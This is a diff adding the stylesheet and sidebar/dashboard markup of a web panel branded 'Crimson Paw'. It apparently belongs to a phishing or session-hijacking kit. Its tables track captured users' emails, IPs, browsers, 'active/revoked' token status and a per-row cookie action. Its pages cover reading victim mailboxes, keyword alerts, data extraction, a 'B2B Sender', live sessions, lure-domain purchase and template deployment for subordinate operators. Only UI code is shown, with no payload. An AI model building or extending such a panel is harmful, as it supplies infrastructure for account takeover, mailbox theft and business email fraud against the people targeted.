+        .lg-input-btn { position: absolute; right: 6px; background: transparent; border: none; color: #a49498; cursor: pointer; font-size: 14px; padding: 4px; border-radius: 4px; }
+        .lg-input-btn:hover { color: #ffffff; background: #2b1115; }
+        .lg-accordion { border: 1px solid #38161b; border-radius: 8px; background: #100b0e; overflow: hidden; margin-top: 4px; }
+        .lg-acc-header { background: #180e12; padding: 11px 14px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid #38161b; user-select: none; }
+        .lg-acc-title { font-size: 0.78rem; font-weight: 700; letter-spacing: 0.5px; color: #f0ebed; display: flex; align-items: center; gap: 8px; }
+        .lg-acc-body { padding: 14px; display: flex; flex-direction: column; gap: 12px; }
+        .lg-acc-body.collapsed { display: none; }
+        .lg-subgroup-title { font-size: 0.68rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.7px; color: #a49498; border-bottom: 1px solid #2e1216; padding-bottom: 4px; margin-top: 6px; }
+        .lg-row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .lg-row-inline { display: flex; align-items: center; gap: 8px; }
+        .lg-color-box { width: 36px; height: 32px; border-radius: 5px; border: 1px solid #4a181e; cursor: pointer; padding: 0; background: transparent; }
+        .lg-color-box::-webkit-color-swatch-wrapper { padding: 0; }
+        .lg-color-box::-webkit-color-swatch { border: none; border-radius: 4px; }
+        .lg-toggle-show { padding: 3px 8px; border-radius: 4px; font-size: 0.68rem; font-weight: 700; background: #261115; color: #ff8b94; border: 1px solid #5a1c22; cursor: pointer; transition: all 0.15s; user-select: none; white-space: nowrap; }
+        .lg-toggle-show.active { background: #4a181e; color: #ffffff; }
+        .lg-toggle-show.hidden-state { background: #120a0d; color: #6e5c61; border-color: #2b1115; }
+        .lg-default-btn { background: #261115; border: 1px solid #5a1c22; color: #d0c2c6; border-radius: 4px; padding: 6px 10px; font-size: 0.68rem; font-weight: 700; cursor: pointer; white-space: nowrap; }
+        .lg-default-btn:hover { color: #fff; background: #3d1419; }
+        .lg-deploy-btn { background: linear-gradient(135deg, #e50914, #b00710); color: #ffffff; border: 1px solid rgba(255,255,255,0.15); border-radius: 8px; padding: 12px 24px; font-size: 0.95rem; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; box-shadow: 0 4px 18px rgba(229, 9, 20, 0.45); transition: all 0.15s; width: fit-content; }
+        .lg-deploy-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 24px rgba(229, 9, 20, 0.65); }
+        .lg-reset-link { color: #a49498; font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; cursor: pointer; margin-top: 4px; border: none; background: none; padding: 0; text-align: left; }
+        .lg-reset-link:hover { color: #f0ebed; }
+        .lg-preview-card { 
+            background: #140d10; 
+            border: 1px solid #38161b; 
+            border-radius: 10px; 
+            padding: 18px; 
+            display: flex; 
+            flex-direction: column; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5); 
+            position: sticky;
+            top: 20px;
+            height: calc(100vh - 40px);
+            min-height: 720px;
+            z-index: 10;
+        }
+        .lg-preview-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; flex-shrink: 0; }
+        .lg-preview-title { font-size: 0.8rem; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 8px; text-transform: uppercase; letter-spacing: 0.6px; }
+        .lg-preview-tabs { display: flex; gap: 4px; background: #0c0709; padding: 3px; border-radius: 6px; border: 1px solid #2e1216; }
+        .lg-preview-tab-btn { background: transparent; border: none; color: #a49498; padding: 5px 12px; font-size: 0.74rem; font-weight: 700; border-radius: 4px; cursor: pointer; transition: all 0.12s; }
+        .lg-preview-tab-btn.active { background: #e50914; color: #ffffff; }
+        .lg-preview-viewport { flex: 1; min-height: 0; background: #0d070a; border-radius: 8px; overflow: hidden; position: relative; box-shadow: inset 0 0 12px rgba(0,0,0,0.5); display: flex; flex-direction: column; }
+        .lg-preview-iframe { width: 100%; height: 100%; border: none; display: block; flex: 1; overflow: hidden; }
+        .lg-preview-footer-url { margin-top: 10px; text-align: center; font-size: 0.78rem; color: #a49498; font-family: monospace; flex-shrink: 0; }
+        .lg-deployments-box { background: #140d10; border: 1px solid #38161b; border-radius: 10px; padding: 20px; }
+        .lg-deploy-header-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+        .lg-table { width: 100%; border-collapse: collapse; background: transparent; }
+        .lg-table th { background: #180e12; color: #a49498; font-size: 0.72rem; text-transform: uppercase; font-weight: 700; padding: 10px 14px; border-bottom: 1px solid #38161b; }
+        .lg-table td { padding: 12px 14px; border-bottom: 1px solid #261115; font-size: 0.82rem; color: #f0ebed; background: transparent; }
+        .lg-table tr:hover td { background: rgba(229, 9, 20, 0.08); }
+        .lg-pill-green { background: #064e3b; color: #34d399; border: 1px solid #059669; padding: 3px 8px; border-radius: 12px; font-size: 0.7rem; font-weight: 700; }
+        .lg-link-txt { color: #ff6b72; text-decoration: none; font-family: monospace; font-size: 0.82rem; }
+        .lg-link-txt:hover { text-decoration: underline; color: #ffffff; }
+        .lg-icon-btn { background: transparent; border: 1px solid #38161b; color: #d0c2c6; border-radius: 4px; padding: 4px 8px; cursor: pointer; font-size: 13px; margin-right: 4px; }
+        .lg-icon-btn:hover { color: #fff; background: #261115; }
+        .lg-mode-capsule { display: inline-flex; background: #0c0709; border: 1px solid #38161b; border-radius: 20px; padding: 2px 4px; gap: 4px; align-items: center; }
+        .lg-mode-btn { width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.72rem; font-weight: 700; color: #a49498; cursor: pointer; transition: all 0.15s; user-select: none; }
+        .lg-mode-btn:hover { color: #ffffff; background: #261115; }
+        .lg-mode-btn.active { background: #e50914; color: #ffffff; box-shadow: 0 0 10px rgba(229, 9, 20, 0.6); }
+        .lg-switch { position: relative; display: inline-block; width: 44px; height: 22px; }
+        .lg-switch input { opacity: 0; width: 0; height: 0; }
+        .lg-slider { position: absolute; cursor: pointer; inset: 0; background-color: #261115; border: 1px solid #5a1c22; transition: .2s; border-radius: 22px; }
+        .lg-slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 2px; background-color: #fff; transition: .2s; border-radius: 50%; }
+        .lg-switch input:checked + .lg-slider { background-color: #e50914; border-color: #ff3b45; }
+        .lg-switch input:checked + .lg-slider:before { transform: translateX(20px); }
+        .lg-editor-box { background: #140d10; border: 1px solid #38161b; border-radius: 8px; padding: 14px; display: flex; flex-direction: column; gap: 11px; margin-bottom: 12px; }
+        .lg-box-title { font-size: 0.72rem; font-weight: 800; color: #f0ebed; text-transform: uppercase; letter-spacing: 0.6px; display: flex; justify-content: space-between; align-items: center; }
+        .lg-hint-text { font-size: 0.7rem; color: #a49498; line-height: 1.45; }
+        .lg-subheading { font-size: 0.68rem; font-weight: 800; color: #a49498; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; margin-bottom: 2px; }
+
+        /* ── Domain Store & Manager Modal Styles ── */
+        .dm-modal { background: #140d10; border: 1px solid #38161b; border-radius: 12px; color: #f0ebed; box-shadow: 0 10px 40px rgba(0,0,0,0.7); max-width: 840px; width: 95%; max-height: 85vh; display: flex; flex-direction: column; overflow: hidden; padding: 0; }
+        .dm-header { background: #180e12; border-bottom: 1px solid #38161b; padding: 16px 22px; display: flex; align-items: center; justify-content: space-between; }
+        .dm-title { font-size: 1.05rem; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 10px; }
+        .dm-tabs { display: flex; gap: 6px; background: #0c0709; border-bottom: 1px solid #2e1216; padding: 8px 22px; }
+        .dm-tab-btn { background: transparent; border: none; color: #a49498; font-size: 0.8rem; font-weight: 700; padding: 7px 14px; border-radius: 6px; cursor: pointer; transition: all 0.15s; }
+        .dm-tab-btn:hover { color: #ffffff; background: #261115; }
+        .dm-tab-btn.active { background: #3d1419; color: #ffffff; box-shadow: 0 0 10px rgba(229, 9, 20, 0.35); }
+        .dm-body { padding: 22px; overflow-y: auto; flex: 1; display: flex; flex-direction: column; gap: 16px; }
+        .dm-search-bar { display: flex; gap: 10px; }
+        .dm-input { flex: 1; background: #0c0709; border: 1px solid #38161b; border-radius: 7px; color: #ffffff; padding: 10px 14px; font-size: 0.9rem; outline: none; }
+        .dm-input:focus { border-color: #e50914; box-shadow: 0 0 0 1px #e50914; }
+        .dm-btn { background: linear-gradient(135deg, #e50914, #b00710); color: #fff; border: 1px solid rgba(255,255,255,0.15); border-radius: 7px; padding: 10px 18px; font-weight: 700; font-size: 0.85rem; cursor: pointer; transition: all 0.15s; display: inline-flex; align-items: center; gap: 6px; }
+        .dm-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(229, 9, 20, 0.5); }
+        .dm-btn-secondary { background: #261115; border: 1px solid #5a1c22; color: #d0c2c6; }
+        .dm-btn-secondary:hover { background: #3d1419; color: #fff; }
+        .dm-tld-chips { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
+        .dm-tld-chip { font-size: 0.75rem; background: #160e12; border: 1px solid #38161b; padding: 4px 10px; border-radius: 5px; color: #d0c2c6; cursor: pointer; user-select: none; display: flex; align-items: center; gap: 5px; }
+        .dm-tld-chip input { accent-color: #e50914; }
+        .dm-results-table { width: 100%; border-collapse: collapse; margin-top: 6px; }
+        .dm-results-table th { background: #180e12; color: #a49498; font-size: 0.72rem; text-transform: uppercase; font-weight: 700; padding: 10px 14px; border-bottom: 1px solid #38161b; text-align: left; }
+        .dm-results-table td { padding: 12px 14px; border-bottom: 1px solid #261115; font-size: 0.85rem; color: #f0ebed; }
+        .dm-badge-avail { background: #064e3b; color: #34d399; border: 1px solid #059669; padding: 3px 8px; border-radius: 12px; font-size: 0.72rem; font-weight: 700; }
+        .dm-badge-taken { background: #374151; color: #9ca3af; border: 1px solid #4b5563; padding: 3px 8px; border-radius: 12px; font-size: 0.72rem; font-weight: 700; }
+        .dm-price-tag { font-weight: 700; color: #ff6b72; font-family: monospace; font-size: 0.9rem; }
+
+        /* ── AngryBadger Dashboard & Table Overhaul (Crimson Paw Theme) ─── */
+        .ab-dashboard-container { width: 100%; height: 100%; overflow-y: auto; background: #0a0608; padding: 22px 28px 40px; box-sizing: border-box; display: flex; flex-direction: column; }
+        
+        /* Top Greeting & Header Bar */
+        .ab-top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 22px; flex-shrink: 0; }
+        .ab-welcome-wrap { display: flex; flex-direction: column; gap: 2px; }
+        .ab-welcome-sub { font-size: 10.5px; font-weight: 700; color: #a49498; letter-spacing: 0.14em; text-transform: uppercase; }
+        .ab-welcome-title { font-size: 22px; font-weight: 800; color: #ffffff; letter-spacing: -0.3px; margin: 0; }
+        .ab-top-actions { display: flex; align-items: center; gap: 14px; }
+        .ab-reset-stats-btn { display: inline-flex; align-items: center; gap: 7px; height: 36px; padding: 0 14px; background: #161014; border: 1px solid #38161b; border-radius: 8px; color: #cbd5e1; font-size: 11.5px; font-weight: 700; cursor: pointer; transition: all 0.18s ease; outline: none; letter-spacing: 0.04em; text-transform: uppercase; }
+        .ab-reset-stats-btn:hover { background: #261115; border-color: #e50914; color: #ffffff; box-shadow: 0 0 14px rgba(229, 9, 20, 0.35); transform: translateY(-1px); }
+        .ab-reset-stats-btn:active { transform: translateY(0); }
+        .ab-reset-stats-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .ab-icon-btn { width: 38px; height: 38px; border-radius: 50%; background: #161014; border: 1px solid #38161b; color: #cbd5e1; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: all 0.15s; outline: none; }
+        .ab-icon-btn:hover { background: #261115; border-color: #e50914; color: #ffffff; box-shadow: 0 0 14px rgba(229, 9, 20, 0.4); }
+        .ab-notif-badge { position: absolute; top: -3px; right: -3px; background: #e50914; color: #ffffff; border-radius: 10px; font-size: 10px; font-weight: 800; padding: 1px 5px; min-width: 14px; text-align: center; border: 2px solid #0a0608; }
+        
+        .ab-notif-dropdown { position: absolute; top: 48px; right: 0; width: 350px; max-width: 90vw; background: #120b0e; border: 1px solid #38161b; border-radius: 10px; box-shadow: 0 10px 36px rgba(0,0,0,0.8); z-index: 1000; overflow: hidden; }
+        .ab-notif-hdr { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; border-bottom: 1px solid #261115; font-size: 13px; font-weight: 700; color: #ffffff; }
+        .ab-notif-clear { font-size: 11px; color: #ff6b72; cursor: pointer; }
+        .ab-notif-clear:hover { color: #ffffff; }
+        .ab-notif-list { max-height: 320px; overflow-y: auto; overflow-x: hidden; }
+        .ab-notif-empty { padding: 20px; text-align: center; color: #a49498; font-size: 12px; }
+        .ab-notif-item { padding: 11px 16px; border-bottom: 1px solid #201014; font-size: 12px; color: #f0ebed; line-height: 1.4; transition: background 0.12s; }
+        .ab-notif-item:hover { background: #1c0e13; }
+        .ab-notif-time { font-size: 10px; color: #a49498; margin-top: 4px; }
+        
+        /* Metrics Bar (Single Wide Card) - 6 Columns */
+        .ab-stats-row { display: grid; grid-template-columns: repeat(6, 1fr); gap: 16px; margin-bottom: 24px; padding: 18px 24px; background: #0f080b; border: 1px solid #2e1216; border-radius: 12px; flex-shrink: 0; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
+        @media (max-width: 1200px) { .ab-stats-row { grid-template-columns: repeat(3, 1fr); gap: 14px; } }
+        @media (max-width: 768px) { .ab-stats-row { grid-template-columns: repeat(2, 1fr); gap: 12px; } }
+        .ab-stat-box { display: flex; flex-direction: column; gap: 4px; min-width: 0; }
+        .ab-stat-label { font-size: 10.5px; font-weight: 700; color: #a49498; letter-spacing: 0.08em; text-transform: uppercase; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .ab-stat-val { font-size: 24px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
+        
+        /* Table Card Container */
+        .ab-table-card { background: #0f080b; border: 1px solid #2e1216; border-radius: 12px; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 4px 24px rgba(0,0,0,0.4); }
+        .ab-table-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 22px; border-bottom: 1px solid #241115; flex-wrap: wrap; gap: 12px; }
+        .ab-table-title-group { display: flex; align-items: center; gap: 10px; font-size: 16px; font-weight: 800; color: #ffffff; }
+        .ab-lock-icon { color: #e50914; flex-shrink: 0; }
+        .ab-count-pill { background: #261115; border: 1px solid #5a1c22; color: #ff8b94; font-size: 11px; font-weight: 800; padding: 2px 9px; border-radius: 12px; }
+        .ab-table-tools { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; position: relative; }
+        .ab-filter-btn { background: #161014; border: 1px solid #38161b; border-radius: 6px; color: #cbd5e1; font-size: 11px; font-weight: 700; padding: 6px 14px; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: all 0.15s; letter-spacing: 0.04em; outline: none; }
+        .ab-filter-btn:hover, .ab-filter-btn.active { background: #261115; border-color: #e50914; color: #ffffff; }
+        .ab-filter-popover { position: absolute; top: 38px; right: 200px; background: #140b0e; border: 1px solid #38161b; border-radius: 8px; padding: 12px 14px; box-shadow: 0 8px 24px rgba(0,0,0,0.7); z-index: 100; min-width: 170px; display: flex; flex-direction: column; gap: 8px; }
+        .ab-filter-popover-title { font-size: 11px; font-weight: 700; color: #ff6b72; text-transform: uppercase; margin-bottom: 4px; }
+        .ab-filter-opt { display: flex; align-items: center; gap: 8px; font-size: 12px; color: #f0ebed; cursor: pointer; }
+        .ab-filter-opt input { accent-color: #e50914; cursor: pointer; }
+        .ab-search-box { display: flex; align-items: center; background: #161014; border: 1px solid #38161b; border-radius: 6px; padding: 2px 10px; gap: 8px; }
+        .ab-search-label { font-size: 10px; font-weight: 700; color: #a49498; letter-spacing: 0.06em; }
+        .ab-search-box input { background: transparent; border: none; outline: none; color: #ffffff; font-size: 12px; padding: 6px 0; width: 140px; font-family: inherit; }
+        .ab-search-box input::placeholder { color: #6e5c61; }
+        
+        /* Table Sub-Bars (Top and Bottom Controls) */
+        .ab-table-subbar { display: flex; justify-content: space-between; align-items: center; padding: 10px 22px; background: #0a0608; border-bottom: 1px solid #201014; font-size: 12px; color: #a49498; flex-wrap: wrap; gap: 10px; }
+        .ab-table-subbar-bottom { border-bottom: none; border-top: 1px solid #201014; }
+        .ab-subbar-left { display: flex; align-items: center; gap: 8px; }
+        .ab-entries-label { font-size: 11px; font-weight: 700; color: #a49498; letter-spacing: 0.05em; }
+        .ab-entries-select { background: #161014; border: 1px solid #38161b; border-radius: 5px; color: #f0ebed; font-size: 12px; padding: 4px 8px; cursor: pointer; outline: none; }
+        .ab-select-pill-btn { background: #161014; border: 1px solid #38161b; border-radius: 5px; color: #cbd5e1; font-size: 11px; font-weight: 700; padding: 4px 10px; cursor: pointer; letter-spacing: 0.04em; transition: all 0.15s; outline: none; }
+        .ab-select-pill-btn:hover { border-color: #e50914; color: #ffffff; background: #261115; }
+        .ab-icon-circle-btn { width: 24px; height: 24px; border-radius: 50%; background: #161014; border: 1px solid #38161b; color: #a49498; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.15s; outline: none; }
+        .ab-icon-circle-btn:hover { border-color: #e50914; color: #ffffff; }
+        .ab-subbar-right { display: flex; align-items: center; gap: 14px; }
+        .ab-page-info { font-size: 11.5px; color: #a49498; }
+        .ab-page-nav { display: flex; align-items: center; gap: 4px; }
+        .ab-page-btn { background: #161014; border: 1px solid #38161b; border-radius: 4px; color: #cbd5e1; font-size: 11.5px; padding: 3px 9px; cursor: pointer; transition: all 0.12s; outline: none; }
+        .ab-page-btn:hover:not(:disabled) { border-color: #e50914; color: #ffffff; background: #261115; }
+        .ab-page-btn.active { background: #e50914; border-color: #e50914; color: #ffffff; font-weight: 700; }
+        .ab-page-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        
+        /* Table Scroll and Elements */
+        .ab-table-scroll { overflow-x: auto; width: 100%; }
+        .ab-table { width: 100%; border-collapse: collapse; text-align: left; }
+        .ab-table th { padding: 12px 14px; font-size: 11px; font-weight: 700; color: #a49498; letter-spacing: 0.06em; text-transform: uppercase; border-bottom: 1px solid #241115; background: #0a0608; white-space: nowrap; user-select: none; }
+        .ab-table th.sortable { cursor: pointer; transition: color 0.15s; }
+        .ab-table th.sortable:hover { color: #ffffff; }
+        .ab-sort-icon { display: inline-block; font-size: 10px; margin-left: 4px; opacity: 0.6; }
+        .ab-table td { padding: 12px 14px; font-size: 12.5px; color: #f0ebed; border-bottom: 1px solid #201014; vertical-align: middle; }
+        .ab-table tbody tr:hover td { background: #160e12; }
+        .ab-name-cell { font-weight: 700; color: #ffffff; white-space: nowrap; }
+        .ab-email-cell { color: #e2e8f0; font-family: monospace; font-size: 12px; white-space: nowrap; }
+        .ab-role-cell { color: #a49498; font-size: 12px; white-space: nowrap; }
+        .ab-ip-cell { font-family: monospace; color: #cbd5e1; font-size: 11.5px; white-space: nowrap; }
+        .ab-browser-cell { max-width: 170px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 11.5px; color: #8e7d82; }
+        .ab-added-cell { font-size: 11.5px; color: #a49498; white-space: nowrap; }
+        
+        /* Token Status Badges */
+        .ab-token-badge { display: inline-flex; align-items: center; justify-content: center; padding: 3px 10px; border-radius: 12px; font-size: 10px; font-weight: 800; letter-spacing: 0.06em; text-transform: uppercase; }
+        .ab-token-badge.active { background: rgba(46, 160, 67, 0.15); color: #3fb950; border: 1px solid rgba(46, 160, 67, 0.45); box-shadow: 0 0 10px rgba(46, 160, 67, 0.2); }
+        .ab-token-badge.revoked { background: rgba(229, 9, 20, 0.15); color: #f85149; border: 1px solid rgba(229, 9, 20, 0.45); box-shadow: 0 0 10px rgba(229, 9, 20, 0.2); }
+        
+        /* Row Actions */
+        .ab-action-group { display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .ab-action-cookie-btn { background: #201115; border: 1px solid #5a1c22; color: #ff8b94; border-radius: 14px; font-size: 10px; font-weight: 800; padding: 4px 10px; cursor: pointer; letter-spacing: 0.05em; transition: all 0.15s; outline: none; }
+        .ab-action-cookie-btn:hover { background: #e50914; border-color: #e50914; color: #ffffff; box-shadow: 0 0 10px rgba(229, 9, 20, 0.5); transform: translateY(-1px); }
+        .ab-action-cookie-btn.ab-cookie-pending { background: #160f12 !important; border-color: #381a1f !important; color: #8e7479 !important; cursor: not-allowed !important; opacity: 0.65; box-shadow: none !important; transform: none !important; }
+        .ab-action-circle-btn { width: 28px; height: 28px; border-radius: 50%; background: #161014; border: 1px solid #38161b; color: #cbd5e1; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.15s; outline: none; }
+        .ab-action-circle-btn:hover { background: #261115; border-color: #e50914; color: #ffffff; transform: translateY(-1px); }
+        .ab-action-delete-btn:hover { background: #450a0a; border-color: #e50914; color: #f85149; }
+
+        /* ── Keyword Alerts Page Styles ────────────────────────────────────────── */
+        .kwa-container { display: flex; flex-direction: column; height: 100%; width: 100%; background: #0a0709; color: #f0ebed; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        .kwa-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: #130c11; border-bottom: 1px solid #2e1216; flex-shrink: 0; flex-wrap: wrap; gap: 14px; }
+        .kwa-stats-strip { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; padding: 14px 24px; background: #0e080c; border-bottom: 1px solid #261014; flex-shrink: 0; }
+        .kwa-stat-card { background: #160e13; border: 1px solid #2e1216; border-radius: 8px; padding: 12px 18px; display: flex; flex-direction: column; gap: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.3); }
+        .kwa-stat-val { font-size: 1.6rem; font-weight: 800; color: #ffffff; }
+        .kwa-stat-lbl { font-size: 11px; text-transform: uppercase; color: #a49498; font-weight: 700; letter-spacing: 0.05em; }
+        .kwa-split-wrap { display: flex; flex: 1; min-height: 0; overflow: hidden; }
+        .kwa-rules-panel { width: 380px; min-width: 320px; background: #10090d; border-right: 1px solid #281014; display: flex; flex-direction: column; overflow: hidden; flex-shrink: 0; }
+        .kwa-rules-header { padding: 12px 18px; border-bottom: 1px solid #240e13; display: flex; justify-content: space-between; align-items: center; background: #150c12; flex-shrink: 0; }
+        .kwa-rules-list { flex: 1; overflow-y: auto; padding: 12px; display: flex; flex-direction: column; gap: 10px; }
+        .kwa-rule-card { background: #160e13; border: 1px solid #2e1216; border-radius: 8px; padding: 14px; transition: all 0.15s; }
+        .kwa-rule-card:hover { border-color: #e50914; box-shadow: 0 0 12px rgba(229,9,20,0.15); }
+        .kwa-rule-card.inactive { opacity: 0.55; }
+        .kwa-badge { display: inline-flex; align-items: center; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.05em; }
+        .kwa-badge-critical { background: rgba(229,9,20,0.15); color: #f85149; border: 1px solid rgba(229,9,20,0.45); }
+        .kwa-badge-high { background: rgba(255,120,31,0.15); color: #ff9f43; border: 1px solid rgba(255,120,31,0.45); }
+        .kwa-badge-medium { background: rgba(229,184,9,0.15); color: #ffd32a; border: 1px solid rgba(229,184,9,0.45); }
+        .kwa-badge-info { background: rgba(9,132,229,0.15); color: #54a0ff; border: 1px solid rgba(9,132,229,0.45); }
+        .kwa-feed-panel { flex: 1; background: #0a0608; display: flex; flex-direction: column; overflow: hidden; min-width: 0; }
+        .kwa-feed-toolbar { padding: 12px 20px; background: #120b10; border-bottom: 1px solid #261014; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; flex-shrink: 0; }
+        .kwa-feed-list { flex: 1; overflow-y: auto; padding: 16px 24px; display: flex; flex-direction: column; gap: 12px; }
+        .kwa-match-card { background: #140d12; border: 1px solid #281014; border-radius: 8px; padding: 16px; transition: all 0.15s; display: flex; flex-direction: column; gap: 10px; }
+        .kwa-match-card:hover { border-color: #4a1c22; background: #190f15; }
+        .kwa-match-card.triaged { opacity: 0.6; }
+        .kwa-kw-chip { background: rgba(252,211,77,0.15); color: #fcd34d; font-weight: 800; font-family: monospace; font-size: 12px; padding: 3px 10px; border-radius: 6px; border: 1px solid rgba(252,211,77,0.3); display: inline-flex; align-items: center; gap: 6px; }
+
+        /* Multi-Operator Mode: Restrict Operators to Mailbox only */
+        body.role-operator #nav-dashboard,
+        body.role-operator #nav-templates,
+        body.role-operator #nav-keyword-alerts,
+        body.role-operator #nav-extractor,
+        body.role-operator #nav-b2b,
+        body.role-operator #nav-sessions,
+        body.role-operator #nav-operators,
+        body.role-operator #nav-settings,
+        body.role-operator #page-dashboard,
+        body.role-operator #page-templates,
+        body.role-operator #page-keyword-alerts,
+        body.role-operator #page-extractor,
+        body.role-operator #page-b2b,
+        body.role-operator #page-sessions,
+        body.role-operator #page-operators,
+        body.role-operator #page-settings {
+            display: none !important;
+        }
+        body.role-operator #nav-mailbox {
+            display: flex !important;
+        }
+        body.role-operator #page-mailbox {
+            display: block !important;
+        }
+    </style>
+</head>
+<body class="{{ 'role-operator' if user_role == 'operator' else 'role-admin' }}">
+    <div class="sidebar" id="sidebar">
+        <button type="button" class="toggle-btn" id="sidebar-toggle-btn" onclick="toggleSidebar()" title="Collapse sidebar">❮</button>
+        <div class="sidebar-header" onclick="handleBrandLogoClick()" style="display:flex; align-items:center; gap:10px; cursor:pointer;" title="Crimson Paw">
+            <img src="/static/img/crimson_paw_logo.png" style="width:28px; height:28px; border-radius:6px; border:1px solid rgba(229,9,20,0.4); box-shadow:0 0 8px rgba(229,9,20,0.5);">
+            <div style="display:flex; flex-direction:column; overflow:hidden;">
+                <span style="font-weight:900; letter-spacing:0.12em; color:#ffffff;">CRIMSON PAW</span>
+                <span id="sidebar-role-badge" style="font-size:9.5px; color:{{ '#58a6ff' if user_role == 'operator' else '#a49498' }}; font-weight:700; letter-spacing:0.06em;">{{ 'OPERATOR' if user_role == 'operator' else 'ADMIN' }}</span>
+            </div>
+        </div>
+        <div class="nav-item {{ 'active' if user_role != 'operator' else '' }}" id="nav-dashboard" onclick="showPage('dashboard', this)"><span class="nav-icon">📊</span><span class="nav-text">Dashboard</span></div>
+        <div class="nav-item" id="nav-templates" onclick="showPage('templates', this)"><span class="nav-icon">📄</span><span class="nav-text">Templates</span></div>
+        <div class="nav-item {{ 'active' if user_role == 'operator' else '' }}" id="nav-mailbox" onclick="showPage('mailbox', this)"><span class="nav-icon">📧</span><span class="nav-text">Mailbox</span></div>
+        <div class="nav-item" id="nav-keyword-alerts" onclick="showPage('keyword-alerts', this)"><span class="nav-icon">🔔</span><span class="nav-text">Keyword Alerts</span><span id="nav-badge-keywords" style="display:none; font-size:10px; background:#e50914; color:#fff; font-weight:800; padding:1px 6px; border-radius:10px; margin-left:auto;">0</span></div>
+        <div class="nav-item" id="nav-extractor" onclick="showPage('extractor', this)"><span class="nav-icon">⚗️</span><span class="nav-text">Extractor & Sorter</span></div>
+        <div class="nav-item" id="nav-b2b" onclick="showPage('b2b', this)"><span class="nav-icon">✉️</span><span class="nav-text">B2B Sender</span></div>
+        <div class="nav-item" id="nav-sessions" onclick="showPage('sessions', this)"><span class="nav-icon">📡</span><span class="nav-text">Live Sessions</span></div>
+        <div class="nav-item" id="nav-operators" onclick="showPage('operators', this)"><span class="nav-icon">👥</span><span class="nav-text">Operators</span><span id="nav-badge-operators" style="display:none; font-size:10px; background:#58a6ff; color:#000; font-weight:800; padding:1px 6px; border-radius:10px; margin-left:auto;">0</span></div>
+        <div class="nav-item" id="nav-settings" onclick="showPage('settings', this)"><span class="nav-icon">⚙️</span><span class="nav-text">Settings</span></div>
+        <div class="nav-item" id="nav-logout" onclick="window.location.href='/logout'" style="margin-top:auto; color:#ff6b72; border-top:1px solid #261115;"><span class="nav-icon">🚪</span><span class="nav-text">Logout</span></div>
+    </div>
+
+    <div class="main-content">
+        <div id="page-dashboard" class="page {{ 'active' if user_role != 'operator' else '' }}" style="padding:0; overflow:hidden;">
+            <div class="ab-dashboard-container">
+                <!-- Top Header: Greeting, User, Notifications, Profile Avatar -->
+                <div class="ab-top-bar">
+                    <div class="ab-welcome-wrap">
+                        <span class="ab-welcome-sub">WELCOME</span>
+                        <h1 class="ab-welcome-title" id="dash-welcome-user">Admin</h1>
+                    </div>
+                    <div class="ab-top-actions">
+                        <!-- Reset Visitor Stats Button -->
+                        <button type="button" class="ab-reset-stats-btn" id="btn-reset-stats" onclick="confirmResetVisitorStats()" title="Reset Visitor Telemetry Statistics">
+                            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
+                                <path d="M3 3v5h5"/>
+                            </svg>
+                            <span>Reset Stats</span>
+                        </button>
+
+                        <!-- Notification Bell -->
+                        <div class="ab-notif-wrap" style="position:relative;">
+                            <button type="button" class="ab-icon-btn" id="ab-notif-btn" onclick="toggleNotifications(event)" title="Notifications">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>
+                                <span class="ab-notif-badge" id="ab-notif-count" style="display:none;">0</span>
+                            </button>
+                            <div class="ab-notif-dropdown" id="ab-notif-dropdown" style="display:none;">
+                                <div class="ab-notif-hdr">
+                                    <span>Notifications</span>
+                                    <span class="ab-notif-clear" onclick="clearNotifications()">Clear all</span>
+                                </div>
+                                <div class="ab-notif-list" id="ab-notif-list">
